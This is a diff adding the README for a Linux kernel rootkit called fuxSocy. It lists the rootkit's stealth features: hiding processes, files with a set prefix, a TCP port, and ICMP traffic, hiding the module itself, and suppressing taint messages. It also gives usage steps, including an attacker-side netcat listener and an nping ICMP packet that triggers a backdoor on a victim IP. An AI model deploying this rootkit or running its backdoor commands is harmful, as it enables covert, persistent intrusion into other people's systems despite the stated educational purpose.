@@ -1,0 +1,30 @@
+fuxSocy
+=========
+
+fuxSocy is a Linux kernel rootkit for educational and research purposes only.
+
+It can:
+
+- Hide processes with `kill -44 <pid>`
+- Hide child processes of hidden processes
+- Hide CPU usage of hidden processes
+- Hide any file/process with prefix "hide_ts_"
+- Hide TCP port 42069 (also from tcpdump)
+- Hide ICMP packets or use them as a backdoor trigger
+- Hide itself from lsmod, /proc/modules, and dmesg
+- Suppress kernel taint messages
+
+Usage:
+load - sudo bash make.sh
+clean - make clean
+backdoor (attacker) - nc -lvnp
+backdoor (attacker) - sudo nping --icmp -c 1 --data-string "fuxSocy_RUN_BACKDOOR" <victims ip>
+
+Tested On: Linux 6.8.0-60-generic x86_64 GNU/Linux
+
+Also a huge part of this code was taken from these repos:
+
+https://github.com/MatheuZSecurity/Rootkit
+https://github.com/sysprog21/lkm-hidden
+
+THANK YOU GUYS SO MUCH!
